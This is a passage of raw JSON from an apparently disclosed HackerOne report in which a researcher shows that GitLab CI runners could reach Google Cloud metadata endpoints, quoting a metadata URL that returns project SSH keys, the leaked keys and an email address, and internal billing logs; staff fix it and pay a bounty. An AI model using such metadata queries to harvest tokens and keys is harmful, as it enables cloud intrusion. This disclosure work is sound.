class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e2018-06-27,com.google.cloud/services/compute-engine/NetworkInternetIngressNaNa,437807272,bytes,https://www.googleapis.com/compute/v1/projects/gitlab-ci-155816/zones/us-east1-d/instances/runner-fa6cab46-srm-1530103488-7d6cd1c6,6781573918892111916,us-east1-d\n2018-06-27,com.google.cloud/services/compute-engine/NetworkInternetIngressCnNa,200,bytes,https://www.googleapis.com/compute/v1/projects/gitlab-ci-155816/zones/us-east1-d/instances/runner-fa6cab46-srm-1530103488-7d6cd1c6,6781573918892111916,us-east1-d\n2018-06-27,com.google.cloud/services/compute-engine/NetworkInternetIngressApacNa,80,bytes,https://www.googleapis.com/compute/v1/projects/gitlab-ci-155816/zones/us-east1-d/instances/runner-fa6cab46-srm-1530103488-7d6cd1c6,6781573918892111916,us-east1-d\n2018-06-27,com.google.cloud/services/compute-engine/NetworkIntraZoneIngress,26396877,bytes,https://www.googleapis.com/compute/v1/projects/gitlab-ci-155816/zones/us-east1-d/instances/runner-fa6cab46-srm-1530103488-7d6cd1c6,6781573918892111916,us-east1-d\n2018-06-27,com.google.cloud/services/compute-engine/Licensed1000208Ram,3277060046848,byte-seconds\n...\netc\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs well as global public keys:\u003cbr\u003e\n\u003ccode\u003ehttp://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-key\u003c/code\u003e\u003cbr\u003e\nreturns\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003etomasz:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAHRDPRmo9+dYMzI3VJP/oD4Miwut5P2c3kyMhUEhV3Rz6bt7TwOaYLacpZ6eOJ+RfCda4cCMiDdS209uUrJzmvtXoh620XF79u7diX1laNYX1fxCwqiyPSmXiNTbeiWql11CLTRVstNaHjyjSHfOxMz6T+PS9rokrNwzsYwmU8m0C0u6CjXMVjWrOZBbBVC6ZC059fZSpwXyOkwMl2BNZ4SQHTb5CBsTNrTyT4hgeU45aZ+AkpbQIsOYlf0JFj9p+BwFvI6d5HKrKoHuvY1ybjSrNroTr5nl5SbHaIYvVWFHVY1FW/eZI2yeDMfJmRPu6LhdQGv7L3jYhZPbhnhTlC8= google-ssh {\u0026quot;userName\u0026quot;:\u0026quot;tomasz@gitlab.com\u0026quot;,\u0026quot;expireOn\u0026quot;:\u0026quot;2018-06-04T21:47:59+0000\u0026quot;}\ntomasz:ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDLtucKrHDdA37CI45Y7SnCMBDw31BLu+L4sk6JltWqRL1gbrURmojXCfnepqNub8UinNKcAqOF5P1oeaA9zmx8= google-ssh {\u0026quot;userName\u0026quot;:\u0026quot;tomasz@gitlab.com\u0026quot;,\u0026quot;expireOn\u0026quot;:\u0026quot;2018-06-04T21:47:56+0000\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhile none of this info is critical as far as I can tell, it is sensitive and I shouldn\u0026#39;t have access to it. But like the rest of GitLab, runners can be spun up outside of your environment. What makes the threat here any different from other SSRF vulnerabilities?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-29T00:58:07.324Z","updated_at":"2018-06-29T01:01:09.397Z","actor":{"username":"plazmaz","cleared":false,"url":"/plazmaz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QggdQvoxRajRsjpzJJKMnuVh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2994552,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @plazmaz ,\n\nThank you for submitting this report. I've sent this on to the development team which I believe intends to reduce the scope of token, investigate lowering the service account privileges, and remove the test key. We are working internally on resolving the issue at https://gitlab.com/gitlab-org/gitlab-runner/issues/3390. The issue will be made public 30 days after a patch has been released. We will keep you updated on our progress via HackerOne.\n\nFeel free to contact us at anytime if you need an update.\n\nBest regards,\nJames\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/plazmaz\"\u003e@plazmaz\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report. I\u0026#39;ve sent this on to the development team which I believe intends to reduce the scope of token, investigate lowering the service account privileges, and remove the test key. We are working internally on resolving the issue at \u003ca title=\"https://gitlab.com/gitlab-org/gitlab-runner/issues/3390\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-runner%2Fissues%2F3390\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab-runner/issues/3390\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. The issue will be made public 30 days after a patch has been released. We will keep you updated on our progress via HackerOne.\u003c/p\u003e\n\n\u003cp\u003eFeel free to contact us at anytime if you need an update.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJames\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-05T17:31:30.876Z","updated_at":"2018-07-05T17:31:30.876Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2994556,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-05T17:31:47.860Z","updated_at":"2018-07-05T17:31:47.860Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3118426,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, since I'm unable to view that issue would you be able to provide an update? What's the status of this bug?","markdown_message":"\u003cp\u003eHi, since I\u0026#39;m unable to view that issue would you be able to provide an update? What\u0026#39;s the status of this bug?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-30T21:37:20.801Z","updated_at":"2018-07-30T21:37:20.801Z","actor":{"username":"plazmaz","cleared":false,"url":"/plazmaz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QggdQvoxRajRsjpzJJKMnuVh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3123960,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@plazmaz ,\n\nI'm checking with the dev team and will let you know what I hear back.\n\nBest regards,\nJames","markdown_message":"\u003cp\u003e\u003ca href=\"/plazmaz\"\u003e@plazmaz\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m checking with the dev team and will let you know what I hear back.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJames\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-31T22:05:10.433Z","updated_at":"2018-07-31T22:05:10.433Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3170154,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jritchey Hate to bump this again, but any news?","markdown_message":"\u003cp\u003e\u003ca href=\"/jritchey\"\u003e@jritchey\u003c/a\u003e Hate to bump this again, but any news?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-10T01:19:15.882Z","updated_at":"2018-08-10T01:19:15.882Z","actor":{"username":"plazmaz","cleared":false,"url":"/plazmaz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QggdQvoxRajRsjpzJJKMnuVh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3230288,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@plazmaz not much to update at the moment besides the development team is aware and are still working on a fix.","markdown_message":"\u003cp\u003e\u003ca href=\"/plazmaz\"\u003e@plazmaz\u003c/a\u003e not much to update at the moment besides the development team is aware and are still working on a fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-22T09:47:10.618Z","updated_at":"2018-08-22T09:47:10.618Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4073064,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @plazmaz ,\n\nThe fix should've been rolled out for this, can you confirm the metadata endpoints are no longer accessible?\n\nBest regards,\nJames","markdown_message":"\u003cp\u003eHi \u003ca href=\"/plazmaz\"\u003e@plazmaz\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThe fix should\u0026#39;ve been rolled out for this, can you confirm the metadata endpoints are no longer accessible?\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJames\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-31T19:29:41.971Z","updated_at":"2019-01-31T19:29:41.971Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4074248,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, it looks like metadata.google.internal is no longer accessible. I am not able to hit any of the endpoints or retrieve data from them. Seems to be resolved.","markdown_message":"\u003cp\u003eHi, it looks like metadata.google.internal is no longer accessible. I am not able to hit any of the endpoints or retrieve data from them. Seems to be resolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-31T23:43:26.342Z","updated_at":"2019-01-31T23:43:26.342Z","actor":{"username":"plazmaz","cleared":false,"url":"/plazmaz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QggdQvoxRajRsjpzJJKMnuVh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4220200,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-26T23:47:27.545Z","updated_at":"2019-02-26T23:47:27.545Z","additional_data":{"old_severity":"High","new_severity":"Medium","old_severity_id":171279,"new_severity_id":304408},"actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4220205,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @plazmaz ,\n\nThank you again for the report! Your finding has been patched and we are awarding a bounty. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nSecurity Team | GitLab Inc.\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/plazmaz\"\u003e@plazmaz\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report! Your finding has been patched and we are awarding a bounty. Congratulations!\u003c/p\u003e\n\n\u003cp\u003ePlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab\u0026#39;s issue tracker.\u003c/p\u003e\n\n\u003cp\u003eWe look forward to your next report!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nSecurity Team | GitLab Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-26T23:48:40.367Z","updated_at":"2019-02-26T23:48:40.367Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"3000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"plazmaz","url":"/plazmaz"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4220206,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-26T23:48:53.337Z","updated_at":"2019-02-26T23:48:53.337Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"plazmaz","url":"/plazmaz"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4318921,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-13T19:57:38.276Z","updated_at":"2019-03-13T19:57:38.276Z","first_to_agree":true,"actor":{"username":"plazmaz","cleared":false,"url":"/plazmaz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QggdQvoxRajRsjpzJJKMnuVh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4318924,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks! Requesting disclosure (after 30 day period is over)","markdown_message":"\u003cp\u003eThanks! Requesting disclosure (after 30 day period is over)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-13T19:57:56.735Z","updated_at":"2019-03-13T19:58:14.873Z","actor":{"username":"plazmaz","cleared":false,"url":"/plazmaz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QggdQvoxRajRsjpzJJKMnuVh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4550179,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-12T19:57:39.009Z","updated_at":"2019-04-12T19:57:39.009Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4559052,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, just wanted to point out that https://gitlab.com/gitlab-org/gitlab-runner/issues/3390 has not been made public. I am unsure if this is intended or not.","markdown_message":"\u003cp\u003eHi, just wanted to point out that \u003ca title=\"https://gitlab.com/gitlab-org/gitlab-runner/issues/3390\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-runner%2Fissues%2F3390\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab-runner/issues/3390\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e has not been made public. I am unsure if this is intended or not.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-14T22:54:06.729Z","updated_at":"2019-04-14T22:54:06.729Z","actor":{"username":"plazmaz","cleared":false,"url":"/plazmaz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QggdQvoxRajRsjpzJJKMnuVh/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":14756,"category":"researcher","content":"GitLab CI runners did not properly restrict access to the google cloud instance metadata APIs, allowing a malicious CI job to create a service token and access internal buckets containing private keys and logfiles.\nI've written a brief blog post on this issue here:\nhttps://dylankatz.com/attacking-cloud-containers-using-ssrf/","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eGitLab CI runners did not properly restrict access to the google cloud instance metadata APIs, allowing a malicious CI job to create a service token and access internal buckets containing private keys and logfiles.\u003cbr\u003e\nI\u0026#39;ve written a brief blog post on this issue here:\u003cbr\u003e\n\u003ca title=\"https://dylankatz.com/attacking-cloud-containers-using-ssrf/\" href=\"/redirect?url=https%3A%2F%2Fdylankatz.com%2Fattacking-cloud-containers-using-ssrf%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://dylankatz.com/attacking-cloud-containers-using-ssrf/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n"}]}